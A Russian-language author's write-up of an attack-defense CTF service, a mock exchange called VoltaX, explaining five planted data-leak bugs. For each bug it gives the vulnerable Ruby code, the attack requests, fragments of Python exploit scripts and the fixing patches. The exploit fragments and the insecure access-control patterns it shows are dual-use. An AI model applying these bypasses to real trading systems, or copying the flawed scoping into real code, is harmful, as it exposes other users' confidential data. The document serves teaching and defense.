# VoltaX Exchange - как биржевые операции раскрывают чужие конфиденциальные данные

*Авторский технический разбор предусмотренных уязвимостей CTF-сервиса в формате «AD». Ruby, Sinatra, PostgreSQL; движок исполнения заявок и фоновые обработчики. Октябрь 2026.*

На бирже неизбежно видны действия других участников: заявки стоят в общем стакане, у каждой сделки две стороны, брокер получает статистику по клиентским операциям, а срабатывания условных ордеров появляются в публичной ленте. Поэтому право видеть общую сделку ещё не означает права читать расчётную квитанцию контрагента.

В VoltaX четыре хранилища флагов: `Order.execution_memo` (Place 1), `TradeReceipt.client_reference` (Place 2), `RFQ.delivery_terms` (Place 3), `ConditionalOrder.signal_context` (Place 4). Всего рассматриваются пять уязвимостей; две из них позволяют независимо получить флаг из второго хранилища. Для некоторых атак необходимо провести настоящую сделку: одного `trade_id` недостаточно.

| Вектор | Обычная операция | Ошибочное раскрытие |
|---|---|---|
| EX-1 | Поиск заявки по `order_ref` | Чужой `execution_memo` |
| EX-2 | Подготовка котировки по RFQ | `workup_terms` |
| EX-3 | Детали собственной сделки | `venue_allocation.desk_ref` |
| EX-4 | Брокерский отчёт | `booking_marker` |
| EX-5 | Публичная лента событий | `signal_context` |

## EX-1: Как поиск по `order_ref` вышел за пределы учётной записи

Трейдер сохраняет `order_ref` и позже ищет по нему заявку. Для этого в VoltaX есть отдельный справочник: он умеет искать и среди заявок одного пользователя, и в общем реестре торгового подразделения. Уязвимость появляется, когда доступный всем владельцам аккаунтов маршрут выбирает второй вариант.

Атакующему не нужно подбирать идентификаторы или добиваться совпадения кодов. Достаточно узнать из публичной подсказки `order_ref` чужой заявки.

**Хранилище:** № 1 (Place 1) · `Order.execution_memo`  
**Уязвимый выход:** `order.execution_memo`  


### Где именно теряется доступ

`OrderReferenceResolver` передаёт `channel: :desk_order`, а `ReferenceDirectory.reference_scope_for` выбирает для него `:desk_book`. После этого `AccountReferenceBook#lookup` обращается к общему `resolve_order_reference` вместо `find_reference_for_account(user_id: ...)`, который ограничивает поиск текущим пользователем. При формировании ответа сведения о найденной заявке, включая `execution_memo`, выдаются без учёта её владельца.

Ошибка возникает ещё до чтения заявки - при выборе области поиска. Исправление умещается в одну строку: для `:desk_order` нужно применять то же ограничение учётной записью, что и в обычном режиме.

`lib/voltax/reference_directory.rb:10–14`:

```ruby
      def lookup(reference_code:)
        return order_repository.resolve_order_reference(reference_code: reference_code) if scope == :desk_book

        order_repository.find_reference_for_account(user_id: account_id, reference_code: reference_code)
      end
```

`lib/voltax/reference_directory.rb:45–49`:

```ruby
    def reference_scope_for(context)
      return :desk_book if context.fetch(:channel) == :desk_order

      :account
    end
```

### Путь атаки

Пользователь с профилем `spot` вызывает `GET /api/orders/lookup/{order_ref}` с кодом из первого хранилища. Поиск в общем реестре возвращает чужую заявку, а `execution_memo` оказывается в ответе. Существенная часть атаки это ошибочный выбор области поиска.

```json
{
  "service": "voltax",
  "place": 1,
  "market": "<market>",
  "order_ref": "order-ref-example"
}
```

```http
GET /api/orders/lookup/{order_ref}
Authorization: Bearer <attacker-token>
```

`ex_client_order_id_collision.py:79–85`:

```python
def get_order_by_reference(host: str, token: str, order_ref: str) -> Mapping[str, Any]:
    encoded = urllib.parse.quote(order_ref, safe="")
    response = request_json(host, "GET", f"/api/orders/lookup/{encoded}", token=token)
    order = response.get("order")
    if not isinstance(order, Mapping):
        raise ExploitError("order response missing")
    return order
```

`ex_client_order_id_collision.py:136–141`:

```python
def extract_order_marker(order: Mapping[str, Any]) -> str:
    for key in ("order_note", "execution_note", "execution_memo"):
        value = order.get(key)
        if isinstance(value, str) and value:
            return value
    raise ExploitError("order marker missing")
```

### Исправление

Для `:desk_order` теперь выбирается `:account`: поиск идёт через `find_reference_for_account`. Владелец по-прежнему находит свои заявки, а другой пользователь не может получить чужую запись. Эталонное исправление меняет одну строку. Если дорабатывать код для постоянной эксплуатации, проверку канала можно убрать совсем: обе ветки после патча возвращают `:account`.

Полный текст эталонного патча::

```diff
diff --git a/lib/voltax/reference_directory.rb b/lib/voltax/reference_directory.rb
--- a/lib/voltax/reference_directory.rb
+++ b/lib/voltax/reference_directory.rb
@@ -52,9 +52,9 @@
     attr_reader :order_repository
 
     def reference_scope_for(context)
-      return :desk_book if context.fetch(:channel) == :desk_order
+      return :account if context.fetch(:channel) == :desk_order
 
       :account
     end
   end
 end
```

---

## EX-2: Расчёт котировки по RFQ раскрыл закрытые условия заявки

Поставщик ликвидности должен получать сведения о запросе котировки (RFQ), иначе он не сможет назвать цену. Поэтому здесь нет общедоступного секретного маршрута: пользователь с подходящим профилем законно запрашивает расчёт через `workup`. Но вместе с данными для котировки сервис возвращает текстовую заметку владельца, которая для определения цены не нужна.

В ответ попадают и параметры расчёта, и содержимое `delivery_terms`. Последнее не должно присутствовать в представлении, предназначенном для котировщика.

**Хранилище:** № 3 (Place 3) · `RFQ.delivery_terms`  
**Уязвимый выход:** `rfq.workup_terms`  


### Где именно теряется доступ

`QuoteWorkupAssembler.packet` собирает `pricing_details`, но дополнительно добавляет `workup_terms: term_sheet.fetch(:terms)`. Метод `term_sheet` без проверки доступности возвращает `rfq[:delivery_terms]`, а `QuoteWorkupDTO` включает это значение в ответ. Профиль `liquidity` даёт право получить расчёт котировки, но не право читать произвольный текст из закрытых условий владельца.

Здесь важно устройство самого сервиса: конфиденциальным считается содержимое `delivery_terms`, куда чекер помещает флаг. В настоящей биржевой системе контрагенту иногда необходимо показывать договорные условия, тогда права доступа к отдельным сведениям следовало бы разделить точнее.

`lib/voltax/services/rfq_service.rb:340–345`:

```ruby
        def packet
          base_row.merge(
            pricing_details: pricing_details,
            workup_terms: term_sheet.fetch(:terms)
          )
        end
```

`lib/voltax/dtos/quote_workup_dto.rb:23–30`:

```ruby
          },
          expires_at: Helpers.iso8601(workup[:expires_at]),
          created_at: Helpers.iso8601(workup[:created_at])
        }
        rendered[:workup_terms] = workup[:workup_terms] if workup.key?(:workup_terms)
        rendered
      end
    end
```

### Путь атаки

Атакующий регистрирует пользователя с профилем `liquidity`, получает из публичной подсказки `rfq_id`, при необходимости проверяет список запросов котировок и обращается к `GET /api/rfq/{rfq_id}/workup`. Закрытые `delivery_terms` возвращаются в поле `rfq.workup_terms`.

```json
{
  "service": "voltax",
  "place": 3,
  "market": "<market>",
  "rfq_id": 123
}
```

```http
GET /api/rfq/{rfq_id}/workup
Authorization: Bearer <liquidity-token>
```


`ex_rfq_preview.py:75–81`:

```python
def workup_rfq(host: str, token: str, rfq_id: Any) -> Mapping[str, Any]:
    encoded = urllib.parse.quote(str(rfq_id), safe="")
    response = request_json(host, "GET", f"/api/rfq/{encoded}/workup", token=token)
    rfq = response.get("rfq")
    if not isinstance(rfq, Mapping):
        raise ExploitError("RFQ workup response missing")
    return rfq
```

`ex_rfq_preview.py:139–144`:

```python
def extract_workup_marker(workup: Mapping[str, Any]) -> str:
    for key in ("workup_terms", "delivery_terms"):
        value = workup.get(key)
        if isinstance(value, str) and value:
            return value
    raise ExploitError("workup marker missing")
```

### Исправление

Патч исключает `workup_terms` из ответа на запрос расчёта и убирает вызов `term_sheet` в этой ветке. Цена, инструмент и параметры ценообразования и расчётов остаются доступными. Меняется только состав выдаваемых сведений; маршрут RFQ и права пользователей не затрагиваются.

Полный текст эталонного патча:

```diff
diff --git a/lib/voltax/services/rfq_service.rb b/lib/voltax/services/rfq_service.rb
--- a/lib/voltax/services/rfq_service.rb
+++ b/lib/voltax/services/rfq_service.rb
@@ -339,8 +339,7 @@ class QuoteWorkupAssembler
 
         def packet
           base_row.merge(
-            pricing_details: pricing_details,
-            workup_terms: term_sheet.fetch(:terms)
+            pricing_details: pricing_details
           )
         end
 
@@ -360,11 +359,6 @@ class QuoteWorkupAssembler
           }
         end
 
-        def term_sheet
-          {
-            terms: rfq[:delivery_terms]
-          }
-        end
       end
     end
   end
```

---

## EX-3: Остаток в стакане и чужая квитанция в собственной сделке

Атака начинается не с поиска уязвимого маршрута, а с заявки, которую исполнили лишь частично. Чекер выставляет на продажу **2.0000** единицы, а встречная покупка забирает только **1.0000**. Оставшаяся единица продолжает стоять в стакане. Владелец заявки остаётся прежним, а его конфиденциальный номер расчётного документа сохраняется.

Атакующий покупает оставшуюся единицу и становится второй стороной **новой, настоящей сделки**. Он вправе смотреть сведения об этой сделке. Но вместе с собственными расчётными данными получает закрытый номер документа контрагента.

**Хранилище:** № 2 (Place 2) · `TradeReceipt.client_reference`  
**Уязвимый выход:** `trade.venue_allocation.desk_ref`  


### Где именно теряется доступ

`TradePresenter.render_participant_detail` формирует две части ответа: `account_booking` описывает квитанцию запрашивающего, а `venue_allocation` - расчётные сведения о другой стороне сделки. Для второй части вызывается `VenueAllocationDTO.notice`: метод добавляет к открытым полям `desk_ref: receipt[:client_reference]`. Так значение из чужой квитанции оказывается в законно доступном ответе о собственной сделке.

Оба расчётных документа относятся к одному `trade_id`, но у них разные владельцы.

`lib/voltax/presenters/trade_presenter.rb:14–32`:

```ruby
      def render_participant_detail(trade, market_symbol:, receipt:, booking_rows: [receipt])
        detail = render(trade, market_symbol: market_symbol).merge(
          account_booking: account_booking(receipt)
        )
        booking_row = booking_rows.find { |row| row[:id] != receipt[:id] }
        return detail unless booking_row

        detail.merge(
          venue_allocation: allocation_notice(booking_row)
        )
      end

      def account_booking(receipt)
        DTOs::AccountBookingDTO.packet(receipt)
      end

      def allocation_notice(receipt)
        DTOs::VenueAllocationDTO.notice(receipt)
      end
```

`lib/voltax/dtos/venue_allocation_dto.rb:5–18`:

```ruby

      def notice(receipt)
        public_notice(receipt).merge(
          desk_ref: receipt[:client_reference]
        )
      end

      def public_notice(receipt)
        {
          side: receipt[:side],
          liquidity_role: receipt[:liquidity_role],
          settlement_status: receipt[:settlement_status]
        }
      end
```

### Путь атаки

Публичная подсказка указывает рынок, сторону неисполненной заявки, диапазон цены, доступный объём и `owner_order_ref`. Атакующий создаёт учётную запись с профилем `spot`, пополняет тестовый баланс через встроенный механизм выдачи средств и выставляет встречную лимитную заявку с ценой, достаточной для исполнения. Затем открывает список собственных сделок и `GET /api/trades/{trade_id}`. Чужой секрет находится в `trade.venue_allocation.desk_ref`, а не в собственном `account_booking`.

У эталонного эксплойта есть риск ошибиться сделкой: он сопоставляет цену и объём, а при единственной новой сделке принимает её без строгой сверки с `owner_order_ref`. При большом числе заявок это может привести к выбору чужого исполнения.

```json
{
  "service": "voltax",
  "place": 2,
  "market": "<market>",
  "side_hint": "sell",
  "quantity": "1.00000000",
  "price_bucket": "10.0-10.9",
  "owner_order_ref": "victim-order-ref"
}
```

```http
POST /api/orders
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"market_symbol":"<market>","side":"buy","order_type":"limit","limit_price":"10.9","quantity":"1.00000000","order_ref":"attacker-order-ref"}

GET /api/users/me/trades
Authorization: Bearer <attacker-token>

GET /api/trades/{trade_id}
Authorization: Bearer <attacker-token>
```

`ex_counterparty_receipt.py:147–148`:

```python
def trade_matches_hint(trade: Mapping[str, Any], price: str, quantity: str) -> bool:
    return decimal_equal(trade.get("price"), price) and decimal_equal(trade.get("quantity"), quantity)
```

`ex_counterparty_receipt.py:222–231`:

```python
def extract_booking_marker(detail: Mapping[str, Any]) -> str:
    for section in ("venue_allocation", "execution_notice", "allocation_context"):
        value = detail.get(section)
        marker = booking_marker_from(value)
        if marker:
            return marker
    marker = booking_marker_from(detail)
    if marker:
        return marker
    raise ExploitError("booking marker missing")
```

### Исправление

В `allocation_notice` вместо подробного `VenueAllocationDTO.notice` для квитанции контрагента вызывается `VenueAllocationDTO.public_notice`. Участник по-прежнему видит собственный `account_booking` и общедоступные сведения о второй стороне (`side`, `liquidity_role`, `settlement_status`), но чужой `desk_ref` из ответа исчезает.

Просмотр собственной сделки сохраняется. Исправление ограничивает только сведения о чужой расчётной квитанции, поэтому отключать маршрут целиком не требуется.

Полный текст эталонного патча:

```diff
diff --git a/lib/voltax/presenters/trade_presenter.rb b/lib/voltax/presenters/trade_presenter.rb
--- a/lib/voltax/presenters/trade_presenter.rb
+++ b/lib/voltax/presenters/trade_presenter.rb
@@ -30,7 +30,7 @@
       end
 
       def allocation_notice(receipt)
-        DTOs::VenueAllocationDTO.notice(receipt)
+        DTOs::VenueAllocationDTO.public_notice(receipt)
       end
     end
   end
```

---

## EX-4: Брокерский отчёт повторно прочитал обе стороны сделки

Брокеру не нужны секреты клиентов, чтобы посчитать объём торгов по кампании и комиссию. Первый запрос, на котором строится отчёт VoltaX, ограничивает выборку нужной кампанией. Утечка появляется позже - когда сервис дополняет уже разрешённые строки новыми сведениями.

Этот второй шаг легко пропустить при проверке безопасности: первоначальный запрос ограничен правильно, но дополнительный запрос уже не наследует его ограничений.

**Хранилище:** № 2 (Place 2) · `TradeReceipt.client_reference`  
**Уязвимый выход:** `trades[].booking_marker`  


### Где именно теряется доступ

Метод `trade_rows` получает разрешённые строки через `base_report_dataset`, ограниченный `broker_user_id`. Затем `execution_enrichment_snapshot(rows)` собирает их `trade_id` и отдельно запрашивает `trade_receipts` без проверки владельца каждой квитанции. Поэтому в дополнительную выборку попадают документы обеих сторон сделки.

`venue_booking_context_for` берёт первый непустой `client_reference`, а `report_row_for` записывает его в `booking_marker`. В брокерском отчёте появляется закрытое поле, не относящееся к разрешённой статистике. Ограничение доступа потеряно при повторном обращении к базе, а не при первом запросе.

`lib/voltax/services/broker_report_service.rb:17–29`:

```ruby
      def trade_rows(user:, month: nil, campaign_id: nil)
        validate_broker!(user)
        dataset = base_report_dataset(broker_user_id: user[:id])
        dataset = dataset.where(Sequel[:campaigns][:id] => parse_id(campaign_id)) if campaign_id
        dataset = apply_month_filter(dataset, month) if month

        rows = dataset.order(Sequel[:campaigns][:id], Sequel[:trades][:created_at], Sequel[:trades][:public_sequence], Sequel[:receipts][:id])
          .all
        enrichment_snapshot = execution_enrichment_snapshot(rows)
        rows.map { |row| report_row_for(row, enrichment_snapshot: enrichment_snapshot) }
      rescue ArgumentError
        raise InvalidRequest
      end
```

`lib/voltax/services/broker_report_service.rb:117–153`:

```ruby
        if origin == "orderbook"
          context = allocation_enrichment_for(row, enrichment_snapshot: enrichment_snapshot)
          report[:booking_marker] = context[:booking_marker] if context&.key?(:booking_marker)
        end
        report
      end

      def allocation_enrichment_for(row, enrichment_snapshot:)
        enrichment_snapshot[row[:trade_id]]
      end

      def execution_enrichment_snapshot(rows)
        trade_ids = rows.map { |row| row[:trade_id] }.uniq
        return {} if trade_ids.empty?

        database[:trade_receipts]
          .where(trade_id: trade_ids)
          .order(:id)
          .all
          .group_by { |receipt| receipt[:trade_id] }
          .transform_values { |receipt_rows| venue_booking_context_for(receipt_rows) }
      end

      def venue_booking_context_for(receipt_rows)
        booking_marker = receipt_rows.map { |receipt| receipt[booking_marker_column] }
          .compact
          .find { |value| !value.to_s.empty? }
        primary = receipt_rows.first
        return {} unless primary

        {
          side: primary[:side],
          liquidity_role: primary[:liquidity_role],
          settlement_status: primary[:settlement_status],
          booking_marker: booking_marker
        }.compact
      end
```

### Путь атаки

Атакующий регистрирует учётную запись с профилем `partner` (сервис назначает ей роль `broker`) и отдельную торговую запись `spot`. Создаёт кампанию, привязывает к ней торговый аккаунт, пополняет тестовый баланс через встроенный механизм выдачи средств и исполняет сделку с оставшейся частью заявки жертвы из второго хранилища. После этого запрашивает отчёт по своей кампании и ищет `trades[].booking_marker`.

Здесь важно правильно определить целевую сделку. Cкрипт берёт первый непустой `booking_marker`, хотя при нескольких исполнениях он может относиться к другой заявке. Поэтому результат нужно связывать с кампанией и доступными признаками конкретной сделки, а не считать флагом любую непустую строку.


```json
{
  "service": "voltax",
  "place": 2,
  "market": "<market>",
  "side_hint": "sell",
  "quantity": "1.00000000",
  "price_bucket": "10.0-10.9",
  "owner_order_ref": "victim-order-ref"
}
```

```http
GET /api/broker/reports/trades?campaign_id={own_campaign_id}
Authorization: Bearer <partner-token>
```

`ex_broker_report.py:64–87`:

```python
def prepare_partner_and_attribution(host: str) -> tuple[str, str, Mapping[str, Any]]:
    nonce = secrets.token_hex(8)
    partner_token = register_user(host, f"ex4-partner-{nonce}", "partner")
    spot_token = register_user(host, f"ex4-spot-{nonce}", "spot")
    faucet(host, spot_token, f"ex4-spot-fund-{nonce}")
    campaign_code = f"ex4-{nonce}"
    campaign_response = request_json(
        host,
        "POST",
        "/api/broker/campaigns",
        payload={"campaign_code": campaign_code, "name": "EX-4 campaign"},
        token=partner_token,
    )
    campaign = campaign_response.get("campaign")
    if not isinstance(campaign, Mapping):
        raise ExploitError("campaign response missing")
    request_json(
        host,
        "POST",
        "/api/broker/attributions",
        payload={"campaign_code": campaign_code},
        token=spot_token,
    )
    return partner_token, spot_token, campaign
```

`ex_broker_report.py:157–165`:

```python
def extract_flag(rows: list[Mapping[str, Any]], *, required: bool = True) -> str | None:
    for row in rows:
        for key in ("booking_marker", "source_marker", "desk_ref"):
            value = row.get(key)
            if isinstance(value, str) and value and value != ATTACKER_NOTE:
                return value
    if required:
        raise ExploitError("flag not found in partner report")
    return None
```

### Исправление

Эталонный патч удаляет `execution_enrichment_snapshot` вместе с добавлением `booking_marker` в отчёт. Для подсчёта объёмов, привязки сделок к кампании, комиссий, вознаграждений и группировки хватает первой выборки. Лучше вовсе не загружать чужие закрытые квитанции, чем удалять секрет только перед отправкой ответа.

Полный текст эталонного патча:

```diff
diff --git a/lib/voltax/services/broker_report_service.rb b/lib/voltax/services/broker_report_service.rb
--- a/lib/voltax/services/broker_report_service.rb
+++ b/lib/voltax/services/broker_report_service.rb
@@ -1,7 +1,6 @@
 require "time"
 require "sequel"
 require_relative "../account_profiles"
 require_relative "../money"
-require_relative "../repositories/trade_receipt_repository"
 
 module VoltaX
@@ -17,12 +16,11 @@
       def trade_rows(user:, month: nil, campaign_id: nil)
         validate_broker!(user)
         dataset = base_report_dataset(broker_user_id: user[:id])
         dataset = dataset.where(Sequel[:campaigns][:id] => parse_id(campaign_id)) if campaign_id
         dataset = apply_month_filter(dataset, month) if month
 
-        rows = dataset.order(Sequel[:campaigns][:id], Sequel[:trades][:created_at], Sequel[:trades][:public_sequence], Sequel[:receipts][:id])
+        dataset.order(Sequel[:campaigns][:id], Sequel[:trades][:created_at], Sequel[:trades][:public_sequence], Sequel[:receipts][:id])
           .all
-        enrichment_snapshot = execution_enrichment_snapshot(rows)
-        rows.map { |row| report_row_for(row, enrichment_snapshot: enrichment_snapshot) }
+          .map { |row| report_row_for(row) }
       rescue ArgumentError
         raise InvalidRequest
@@ -84,7 +81,7 @@
         dataset.where { Sequel[:trades][:created_at] >= start_time }
           .where { Sequel[:trades][:created_at] < end_time }
       end
 
-      def report_row_for(row, enrichment_snapshot:)
+      def report_row_for(row)
         origin = origin_for(row[:client_order_id])
         notional_volume = Money.coerce_decimal(row[:notional_volume])
@@ -111,54 +108,15 @@
           liquidity_band: liquidity_band_for(notional_volume),
           venue_code: venue_code_for(row[:market_symbol]),
           fee_tier: fee_tier_for(row),
           rebate_hint: rebate_hint_for(row),
           routing_label: routing_label_for(origin)
         }
-        if origin == "orderbook"
-          context = allocation_enrichment_for(row, enrichment_snapshot: enrichment_snapshot)
-          report[:booking_marker] = context[:booking_marker] if context&.key?(:booking_marker)
-        end
         report
       end
 
-      def allocation_enrichment_for(row, enrichment_snapshot:)
-        enrichment_snapshot[row[:trade_id]]
-      end
-
-      def execution_enrichment_snapshot(rows)
-        trade_ids = rows.map { |row| row[:trade_id] }.uniq
-        return {} if trade_ids.empty?
-
-        database[:trade_receipts]
-          .where(trade_id: trade_ids)
-          .order(:id)
-          .all
-          .group_by { |receipt| receipt[:trade_id] }
-          .transform_values { |receipt_rows| venue_booking_context_for(receipt_rows) }
-      end
-
-      def venue_booking_context_for(receipt_rows)
-        booking_marker = receipt_rows.map { |receipt| receipt[booking_marker_column] }
-          .compact
-          .find { |value| !value.to_s.empty? }
-        primary = receipt_rows.first
-        return {} unless primary
-
-        {
-          side: primary[:side],
-          liquidity_role: primary[:liquidity_role],
-          settlement_status: primary[:settlement_status],
-          booking_marker: booking_marker
-        }.compact
-      end
-
-      def booking_marker_column
-        Repositories::TradeReceiptRepository::BOOKING_MARKER_COLUMN
-      end
-
       def liquidity_band_for(notional_volume)
         return "micro" if notional_volume < Money.coerce_decimal("10")
         return "block" if notional_volume >= Money.coerce_decimal("1000")
 
         "standard"
       end
```

---

## EX-5: Секрет попал в публичную ленту ещё при создании события

Условный ордер остаётся закрытым до срабатывания заданной цены. Когда порог достигнут, торговый движок публикует событие `market_signal_activated`. В общей ленте допустимо показать факт активации и сведения о рынке, но не `signal_context` владельца. Утечка проходит три этапа: создание события -> сохранение в базе -> выдача в публичной ленте.

Здесь необходимо не только добиться срабатывания условия, но и затем найти нужное событие среди остальных сообщений ленты.

**Хранилище:** № 4 (Place 4) · `ConditionalOrder.signal_context`  
**Уязвимый выход:** `events[].payload.signal_context`  


### Где именно теряется доступ

`ConditionalTriggerService.activation_context_for` помещает `order[:signal_context]` в `activation_context.signal` и сохраняет его в данных события. При чтении `PublicFeedEventPresenter` вызывает `ActivationContextDTO.expanded_attributes`, который переносит все вложенные значения в выходной ответ. Каждое действие по отдельности выглядит обычным преобразованием данных, но вместе они раскрывают закрытую заметку.

Патч должен защищать оба этапа. Если прекратить запись секрета в новые события, прежние записи продолжат его содержать. Если скрыть поле только в ответах, новые события всё равно будут сохранять закрытый текст. Эталонный патч устраняет обе причины.

`lib/voltax/services/conditional_trigger_service.rb:141–150`:

```ruby
      def activation_context_for(order)
        DTOs::ActivationContextDTO.render(
          signal: {
            kind: order[:trigger_type],
            threshold: Money.format(order[:trigger_price]),
            routing_profile: routing_profile_for(order),
            signal_context: order[:signal_context]
          }
        )
      end
```

`lib/voltax/presenters/public_feed_event_presenter.rb:70–77`:

```ruby
      def normalize_event_attributes(rendered, value)
        return rendered unless value.is_a?(Hash)

        DTOs::ActivationContextDTO.expanded_attributes(value).each do |key, context_value|
          rendered[key.to_sym] = context_value
        end
        rendered
      end
```

`lib/voltax/dtos/activation_context_dto.rb:19–31`:

```ruby
      def expanded_attributes(value)
        deep_event_attributes(value)
      end

      def public_attributes(value)
        signal = value.is_a?(Hash) ? value["signal"] || value[:signal] : nil
        return {} unless signal.is_a?(Hash)

        PUBLIC_SIGNAL_KEYS.each_with_object({}) do |key, rendered|
          attribute = signal[key] || signal[key.to_sym]
          rendered["signal_#{key}"] = attribute unless attribute.nil?
        end
      end
```

### Путь атаки

Публичная подсказка содержит рынок, `conditional_order_id` и `since_sequence`. При необходимости эксплойт двумя собственными встречными заявками вызывает исполнение по нужной цене. Затем опрашивает `/api/feed/public`, пропускает события другого типа и записи с `sequence <= since_sequence`, сверяет `conditional_order_id` и извлекает `signal_context`.

В эталонном скрипте рекурсивная функция также считает `trigger_profile` возможным результатом. Это может дать ложное срабатывание: значение настройки ордера не обязательно является флагом. Для соревнования нужно проверять формат флага и совпадение идентификатора целевого ордера.

```json
{
  "service": "voltax",
  "place": 4,
  "market": "<market>",
  "conditional_order_id": 123,
  "since_sequence": 42,
  "trigger_bucket": "100.0-100.9",
  "quantity": "1.00000000"
}
```

```http
GET /api/feed/public?market={market}&since_sequence={sequence}&limit=100
```

`ex_conditional_feed.py:161–194`:

```python
def poll_feed_for_flag(host: str, attack_data: Mapping[str, Any]) -> str:
    market_symbol = required_string(attack_data, "market", fallback_key="market_symbol")
    anchor_sequence = required_sequence(attack_data, "since_sequence", "after_sequence")
    since_sequence = str(anchor_sequence)
    for _attempt in range(20):
        query = urllib.parse.urlencode(
            {
                "market": market_symbol,
                "since_sequence": since_sequence,
                "limit": "100",
            }
        )
        response = request_json(host, "GET", f"/api/feed/public?{query}")
        events = response.get("events")
        if not isinstance(events, list):
            raise ExploitError("feed response missing")
        for event in events:
            if not isinstance(event, Mapping) or event.get("event_type") != "market_signal_activated":
                continue
            event_sequence = optional_sequence(event.get("sequence"))
            if event_sequence is None or event_sequence <= anchor_sequence:
                continue
            payload = event.get("payload")
            if not isinstance(payload, Mapping):
                continue
            expected_id = attack_data.get("conditional_order_id")
            observed_id = payload.get("conditional_order_id")
            if expected_id not in (None, "") and str(observed_id) != str(expected_id):
                continue
            value = activation_marker_from(payload)
            if isinstance(value, str) and value and value != ATTACKER_NOTE:
                return value
        time.sleep(0.25)
    raise ExploitError("flag not found in public feed")
```

`ex_conditional_feed.py:197–212`:

```python
def activation_marker_from(value: Any) -> str | None:
    if isinstance(value, Mapping):
        for key in ("signal_context", "activation_marker", "trigger_profile"):
            direct = value.get(key)
            if isinstance(direct, str) and direct:
                return direct
        for child in value.values():
            found = activation_marker_from(child)
            if found:
                return found
    elif isinstance(value, list):
        for child in value:
            found = activation_marker_from(child)
            if found:
                return found
    return None
```

### Исправление

Исправление охватывает и создание события, и его выдачу: `ConditionalTriggerService` больше не добавляет `signal_context` в новые события, а `PublicFeedEventPresenter` использует ограниченный набор полей из `ActivationContextDTO.public_attributes`. Поэтому даже старые события больше не должны раскрывать закрытый текст через этот HTTP-маршрут.

При этом уже записанные значения остаются в базе событий, резервных копиях и, возможно, журналах. В реальной системе после такой утечки потребовались бы отдельная очистка и правила хранения данных.

Полный текст эталонного патча:

```diff
diff --git a/lib/voltax/presenters/public_feed_event_presenter.rb b/lib/voltax/presenters/public_feed_event_presenter.rb
--- a/lib/voltax/presenters/public_feed_event_presenter.rb
+++ b/lib/voltax/presenters/public_feed_event_presenter.rb
@@ -67,20 +67,16 @@
         {}
       end
 
       def normalize_event_attributes(rendered, value)
         return rendered unless value.is_a?(Hash)
 
-        DTOs::ActivationContextDTO.expanded_attributes(value).each do |key, context_value|
+        DTOs::ActivationContextDTO.public_attributes(value).each do |key, context_value|
           rendered[key.to_sym] = context_value
         end
         rendered
-      end
-
-      def deep_event_attributes(value, prefix: nil)
-        DTOs::ActivationContextDTO.deep_event_attributes(value, prefix: prefix)
       end
 
       def parsed_payload(payload_json)
         payload_json.is_a?(Hash) ? payload_json : JSON.parse(payload_json.to_s)
       end
     end
diff --git a/lib/voltax/services/conditional_trigger_service.rb b/lib/voltax/services/conditional_trigger_service.rb
--- a/lib/voltax/services/conditional_trigger_service.rb
+++ b/lib/voltax/services/conditional_trigger_service.rb
@@ -140,14 +140,13 @@
 
       def activation_context_for(order)
         DTOs::ActivationContextDTO.render(
           signal: {
             kind: order[:trigger_type],
             threshold: Money.format(order[:trigger_price]),
-            routing_profile: routing_profile_for(order),
-            signal_context: order[:signal_context]
+            routing_profile: routing_profile_for(order)
           }
         )
       end
 
       def routing_profile_for(order)
         [order[:order_type], order[:side], "central-book"].compact.join(":")
```

## Что объединяет эти пять уязвимостей

В каждом случае операция сама по себе законна, но связанные с ней объекты имеют разные права доступа. Поиск заявки нужно ограничивать учётной записью, ответ на запрос котировки должен содержать только нужные для расчёта сведения, в деталях сделки допустимы открытые данные второй стороны, но не её закрытая квитанция, брокерскому отчёту достаточно статистики, публичной ленте - разрешённых сведений о событии.

EX-3 и EX-4 стоит рассматривать вместе: оба раскрывают секрет второго хранилища, но по разным каналам - в подробностях собственной сделки и при дополнительной выборке для брокерского отчёта. EX-5 показывает другую опасность: исправив сохранение новых событий, нельзя забывать о секретах, которые уже находятся в базе.
